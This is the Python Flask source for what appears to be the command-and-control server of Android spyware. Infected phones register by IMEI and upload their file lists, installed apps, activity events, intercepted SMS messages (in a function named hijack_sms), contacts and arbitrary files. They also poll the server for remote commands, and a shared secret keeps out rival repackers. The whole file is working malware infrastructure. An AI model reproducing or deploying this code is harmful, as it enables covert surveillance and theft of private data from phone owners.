from flask import Flask, request
import base64
import string
from utils.database import MongoClient, get_secret
from datetime import datetime
import os

app = Flask(__name__)
mongo = MongoClient()


@app.route('/register', methods=['POST', 'GET'])
def register():
    try:
        data = request.json
    except Exception as e:
        print(e)
        return 'request is not correct'
    secret = data['s']
    if secret != get_secret():
        return 'nice try, don\'t try to repack a repack'

    imei = data['i']
    _id = mongo.add_imei(imei)
    return _id


@app.route('/files', methods=['POST'])
def files_list():
    try:
        data = request.json
    except Exception as e:
        print(e)
        return 'request is not correct'

    secret = data['s']
    if secret != get_secret():
        return 'nice try, don\'t try to repack a repack'
    _id = data['k']
    files = data['data'].split(';')

    result = mongo.add_files_for_id(_id, files[:-1])

    if result:
        return 'yes'
    return 'no'


@app.route('/apps', methods=['POST'])
def installed_apps():
    try:
        data = request.json
    except Exception as e:
        print(e)
        return 'request is not correct'

    secret = data['s']
    if secret != get_secret():
        return 'nice try, don\'t try to repack a repack'
    _id = data['k']
    apps = data['data'].split(';')

    result = mongo.add_apps_for_id(_id, apps[:-1])

    if result:
        return 'yes'
    return 'no'


@app.route('/events', methods=['POST'])
def user_events():
    data = request.json
    secret = data['s']
    if secret != get_secret():
        return 'nice try, don\'t try to repack a repack'
    _id = data['k']
    events = data['data'].split('\n')[1:-1]

    events_dict = {}
    for e in events:
        split_e = e.split(';')
        t = datetime.strptime(split_e[1], "%b %d, %Y %I:%M:%S %p")
        event = split_e[0][:-1]
        if event in events_dict:
            events_dict[event].append(t.timestamp())
        else:
            events_dict[event] = [t.timestamp()]
    result = mongo.add_events_for_id(_id, events_dict)

    if result:
        return 'yes'
    return 'no'


@app.route('/sms', methods=['POST'])
def hijack_sms():
    try:
        data = request.json
    except Exception as e:
        print(e)
        return 'request is not correct'

    secret = data['s']
    if secret != get_secret():
        return 'nice try, don\'t try to repack a repack'
    _id = data['k']
    sms = data['data'].split('\n')[:-2]
    sms_list = []
    for s in sms:
        sms_list.append(s.split(';')[1])
    result = mongo.add_sms_for_id(_id, sms_list)

    if result:
        return 'yes'
    return 'no'


@app.route('/command', methods=['POST'])
def command():
    try:
        data = request.json
    except Exception as e:
        print(e)
        return 'request is not correct'

    secret = data['s']
    if secret != get_secret():
        return 'nice try, don\'t try to repack a repack'
    _id = data['k']

    cmd = mongo.get_command_for_id(_id)

    return cmd


@app.route('/upfile', methods=['POST'])
def upfile():
    data = request.json
    secret = data['s']
    if secret != get_secret():
        return 'nice try, don\'t try to repack a repack'

    filename = data['n']
    raw = base64.b64decode(data['r'])
    imei = data['i']
    new_name = os.path.join(imei, filename)

    # database.register_file(imei, filename, new_name)
    with open(new_name, 'wb') as f:
        f.write(raw)


@app.route('/upcontacts', methods=['POST'])
def upcontacts():
    data = request.json
    secret = data['s']
    if secret != get_secret():
        return 'nice try, don\'t try to repack a repack'

    imei = data['i']
    contacts = data['c'].split(',')

    # database.register_contacts(imei, contacts)


if __name__ == '__main__':
    app.run()
